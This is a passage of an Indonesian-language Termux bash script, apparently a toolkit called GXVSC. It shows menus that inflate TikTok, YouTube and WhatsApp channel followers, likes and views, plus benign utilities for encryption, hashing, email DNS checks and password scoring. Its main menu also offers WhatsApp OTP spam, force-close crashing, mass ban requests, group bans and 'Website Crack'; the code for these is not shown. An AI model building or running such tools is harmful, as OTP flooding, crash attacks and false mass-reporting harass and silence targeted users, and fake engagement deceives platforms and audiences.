    local name="$1" link="$2" qty="$3" fn="$4" service_id="${5:-}"
    clear
    line
    c "${magenta}${name}${reset}\n"
    c "${gray}link   ${reset} ${white}${link}${reset}\n"
    c "${gray}target ${reset} ${white}${qty}${reset}\n"
    line
    printf "\n"

    local tmpfile="$HOME/.gxvsc_boost_$$"
    : > "$tmpfile"

    (
        bash -c "$(declare -f $fn); $fn '$link' '$qty' > '$tmpfile' 2>&1"
    ) &
    local pid=$!
    _loadbar "$pid" "boost · $name"
    wait "$pid" 2>/dev/null

    local res; res="$(tail -n1 "$tmpfile" 2>/dev/null | tr -d '\n')"
    rm -f "$tmpfile"

    printf "\n"
    line
    if [[ -n "$SMM_PANEL_URL" && -n "$SMM_PANEL_KEY" ]]; then
        c "${green}panel response${reset}\n"
        c "   ${gray}${res}${reset}\n"
    else
        c "   ${green}✓${reset}  ${white}berhasil${reset}  ${white}${res:-0}${reset}${gray}/${qty}${reset}\n"
        c "   ${gray}·  slot-based — volume besar butuh panel SMM${reset}\n"
    fi
    line
    pause
}

menu_tiktok() {
    while true; do
        clear; line; c "${magenta}TIKTOK BOOST${reset}\n"; line
        printf "[01] TikTok Followers  ${gray}max 5jt${reset}\n"
        printf "[02] TikTok Likes      ${gray}max 5jt${reset}\n"
        printf "[03] TikTok Views      ${gray}max 5jt${reset}\n"
        printf "[04] TikTok Share      ${gray}max 5jt${reset}\n"
        printf "[05] TikTok Favorite   ${gray}max 5jt${reset}\n"
        printf "[00] Kembali\n\n"
        printf "${cyan}[ INPUT PILIHAN ]${reset} "; read -r o
        local link qty
        case "$o" in
            1) link="$(ask_link 'Link Profile')"; qty="$(ask_target 'Target Followers')"
               run_boost "TikTok Followers" "$link" "$qty" b_tt_followers "tt_follow" ;;
            2) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Like')"
               run_boost "TikTok Likes" "$link" "$qty" b_tt_like "tt_like" ;;
            3) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Views')"
               run_boost "TikTok Views" "$link" "$qty" b_tt_view "tt_view" ;;
            4) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Share')"
               run_boost "TikTok Share" "$link" "$qty" b_tt_share "tt_share" ;;
            5) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Favorite')"
               run_boost "TikTok Favorite" "$link" "$qty" b_tt_favorite "tt_fav" ;;
            0|00) return ;;
            *) continue ;;
        esac
    done
}

menu_whatsapp_ch() {
    clear; line; c "${magenta}WHATSAPP SALURAN BOOST${reset}\n"; line
    printf "${white}Follow Saluran WhatsApp${reset}\n"
    printf "${gray}max 5jt followers${reset}\n\n"
    local link qty
    link="$(ask_link 'Input Link Saluran')"
    qty="$(ask_target 'Target Followers')"
    run_boost "WhatsApp Saluran Followers" "$link" "$qty" b_wa_channel_follow "wa_channel"
}

menu_youtube() {
    while true; do
        clear; line; c "${magenta}YOUTUBE BOOST${reset}\n"; line
        printf "[01] YouTube Subscribe  ${gray}max 5jt${reset}\n"
        printf "[02] YouTube Like       ${gray}max 5jt${reset}\n"
        printf "[03] YouTube Share      ${gray}max 5jt${reset}\n"
        printf "[04] YouTube Views      ${gray}max 5jt${reset}\n"
        printf "[00] Kembali\n\n"
        printf "${cyan}[ INPUT PILIHAN ]${reset} "; read -r o
        local link qty
        case "$o" in
            1) link="$(ask_link 'URL Profile')"; qty="$(ask_target 'Target Subscribe')"
               run_boost "YouTube Subscribe" "$link" "$qty" b_yt_subscribe "yt_sub" ;;
            2) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Like')"
               run_boost "YouTube Like" "$link" "$qty" b_yt_like "yt_like" ;;
            3) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Share')"
               run_boost "YouTube Share" "$link" "$qty" b_yt_share "yt_share" ;;
            4) link="$(ask_link 'URL Video')"; qty="$(ask_target 'Target Views')"
               run_boost "YouTube Views" "$link" "$qty" b_yt_views "yt_view" ;;
            0|00) return ;;
            *) continue ;;
        esac
    done
}

suntik_sosmed() {
    while true; do
        clear; line; c "${magenta}SUNTIK SOSMED — BOOST${reset}\n"; line
        printf "${white}Pilih Platform${reset}\n\n"
        printf "[01] Instagram\n"
        printf "[02] WhatsApp\n"
        printf "[03] TikTok\n"
        printf "[04] YouTube\n"
        printf "[00] Kembali\n\n"
        printf "${cyan}[ INPUT PILIHAN ]${reset} "; read -r o
        case "$o" in
            1) menu_instagram ;;
            2) menu_whatsapp_ch ;;
            3) menu_tiktok ;;
            4) menu_youtube ;;
            0|00) return ;;
            *) continue ;;
        esac
    done
}

# ─────────────────────────────────────────────────────────────
# UTILITIES
# ─────────────────────────────────────────────────────────────

encrypt_file() {
    ensure_pkg openssl openssl || { pause; return; }
    printf "\n${white}Path file:${reset} "; read -r src
    [[ -f "$src" ]] || { c "${red}Tidak ditemukan.${reset}\n"; pause; return; }
    local out="${src}.gixv"
    printf "${white}Output [${out}]:${reset} "; read -r cu; [[ -n "$cu" ]] && out="$cu"
    printf "${yellow}Password: ${reset}"; read -rs pass; printf "\n"
    [[ -n "$pass" ]] || { c "${red}Kosong.${reset}\n"; pause; return; }
    if printf '%s' "$pass" | openssl enc -aes-256-cbc -pbkdf2 -salt -pass stdin -in "$src" -out "$out"; then
        c "${green}OK: ${out}${reset}\n"
    else rm -f "$out"; c "${red}Gagal.${reset}\n"; fi
    pause
}

decrypt_file() {
    ensure_pkg openssl openssl || { pause; return; }
    printf "\n${white}Path file .gixv:${reset} "; read -r src
    [[ -f "$src" ]] || { c "${red}Tidak ditemukan.${reset}\n"; pause; return; }
    local out="${src%.gixv}"; [[ "$out" == "$src" ]] && out="${src}.dec"
    printf "${white}Output [${out}]:${reset} "; read -r cu; [[ -n "$cu" ]] && out="$cu"
    printf "${yellow}Password: ${reset}"; read -rs pass; printf "\n"
    if printf '%s' "$pass" | openssl enc -d -aes-256-cbc -pbkdf2 -pass stdin -in "$src" -out "$out"; then
        c "${green}OK: ${out}${reset}\n"
    else rm -f "$out"; c "${red}Gagal.${reset}\n"; fi
    pause
}

hash_file() {
    printf "\n${white}Path file:${reset} "; read -r src
    [[ -f "$src" ]] || { c "${red}Tidak ditemukan.${reset}\n"; pause; return; }
    c "\n${cyan}SHA-256:${reset}\n"; sha256sum "$src"
    c "\n${cyan}SHA-512:${reset}\n"; sha512sum "$src"
    pause
}

email_domain_audit() {
    ensure_pkg dig dnsutils || { pause; return; }
    printf "\n${white}Domain: ${reset}"; read -r domain
    domain="${domain#http://}"; domain="${domain#https://}"; domain="${domain%%/*}"
    line; c "${white}AUDIT: ${domain}${reset}\n"; line
    c "${cyan}MX:${reset}\n"; dig +short MX "$domain" || true; printf "\n"
    c "${cyan}SPF:${reset}\n"; dig +short TXT "$domain" | grep -i 'v=spf1' || c "${yellow}-${reset}\n"; printf "\n"
    c "${cyan}DMARC:${reset}\n"; dig +short TXT "_dmarc.${domain}" || c "${yellow}-${reset}\n"; printf "\n"
    printf "${white}DKIM selector [google]: ${reset}"; read -r sel; sel="${sel:-google}"
    dig +short TXT "${sel}._domainkey.${domain}" || true
    pause
}

email_header_audit() {
    ensure_pkg python python || { pause; return; }
    printf "\n${white}Paste header. Akhiri baris kosong:${reset}\n"
    local l="" h=""
    while IFS= read -r l; do [[ -z "$l" ]] && break; h+="$l"$'\n'; done
    printf "%s" "$h" | python -c '
import sys
for x in sys.stdin.read().splitlines():
    if x.lower().startswith(("authentication-results","received","return-path","from","to","subject")):
        print(x)
'
    pause
}

password_audit() {
    printf "\n${white}Password (lokal): ${reset}"; read -rs pw; printf "\n"
    local s=0 n=${#pw}
    (( n>=12 )) && ((s++)); (( n>=16 )) && ((s++))
    [[ "$pw" =~ [a-z] ]] && ((s++)); [[ "$pw" =~ [A-Z] ]] && ((s++))
    [[ "$pw" =~ [0-9] ]] && ((s++)); [[ "$pw" =~ [^a-zA-Z0-9] ]] && ((s++))
    c "${cyan}Panjang: ${n}${reset}\n${cyan}Skor: ${s}/6${reset}\n"
    if (( s>=5 )); then c "${green}Kuat.${reset}\n"; elif (( s>=3 )); then c "${yellow}Sedang.${reset}\n"; else c "${red}Lemah.${reset}\n"; fi
    pause
}

social_access() {
    ensure_pkg termux-open-url termux-api || true
    while true; do
        clear; line; c "${white}SOCIAL MEDIA ACCESS${reset}\n"; line
        printf "[01] TikTok\n[02] WhatsApp\n[03] Instagram\n[04] YouTube\n[00] Kembali\n\n"
        printf "${cyan}Pilih: ${reset}"; read -r o
        case "$o" in
            1) u="https://www.tiktok.com/";;
            2) u="https://www.whatsapp.com/";;
            3) u="https://www.instagram.com/";;
            4) u="https://www.youtube.com/";;
            0|00) return;;
            *) continue;;
        esac
        if have termux-open-url; then termux-open-url "$u"; else printf "\n${yellow}%s${reset}\n" "$u"; pause; fi
    done
}

# ─────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────

main_menu() {
    while true; do
        banner
        c "   ${white}${gray}─────${reset} ${cyan}WHATSAPP${reset} ${gray}─────────────────────${reset}\n"
        c "   ${green}[01]${reset}  OTP Spam\n"
        c "   ${green}[02]${reset}  Force Close\n"
        c "   ${green}[03]${reset}  Ban Request\n"
        c "   ${green}[04]${reset}  Unban Appeal\n"
        c "   ${green}[08]${reset}  Nokos Free\n"
        c "   ${green}[09]${reset}  Group Ban\n"
        printf "\n"
        c "   ${white}${gray}─────${reset} ${cyan}TOOLS${reset} ${gray}────────────────────────${reset}\n"
c "   ${green}[05]${reset}  Website Crack\n"
c "   ${green}[06]${reset}  Encrypt APK/File\n"
c "   ${green}[07]${reset}  Encrypt File\n"
c "   ${green}[10]${reset}  Social Media Access\n"
c "   ${green}[11]${reset}  Decrypt File\n"
c "   ${green}[12]${reset}  SHA-256 / SHA-512\n"
c "   ${green}[13]${reset}  Email Domain Audit\n"
c "   ${green}[14]${reset}  Email Header Audit\n"
c "   ${green}[15]${reset}  Password Strength\n"
printf "\n"
c "   ${white}${gray}─────${reset} ${magenta}BOOST${reset} ${gray}────────────────────────${reset}\n"
c "   ${magenta}[16]${reset}  Suntik Sosmed\n"
        c "   ${red}[00]${reset}  ${red}KELUAR / SHUTDOWN${reset}\n"
        printf "\n"
        c "${cyan}   ▶ ${white}pilih${reset} ${gray}»${reset} "
        read -r choice
        printf "\n"
        case "$choice" in
            1) wa_otp_spam ;;
            2) wa_force_close ;;
            3) wa_ban ;;
            4) wa_unban ;;
            5) website_crack ;;
            6|7) encrypt_file ;;
            8) nokos_free ;;
            9) wa_group_ban ;;
            10) social_access ;;
            11) decrypt_file ;;
            12) hash_file ;;
            13) email_domain_audit ;;
            14) email_header_audit ;;
            15) password_audit ;;
            16) suntik_sosmed ;;
            0|00)
                clear
                c "\n   ${cyan}${white}GXVSC shutdown.${reset}\n"
                c "   ${gray}developer : ${DEV}${reset}\n\n"
                exit 0 ;;
            *) c "   ${red}✗ invalid${reset}\n"; sleep 1 ;;
        esac
    done
}

main_menu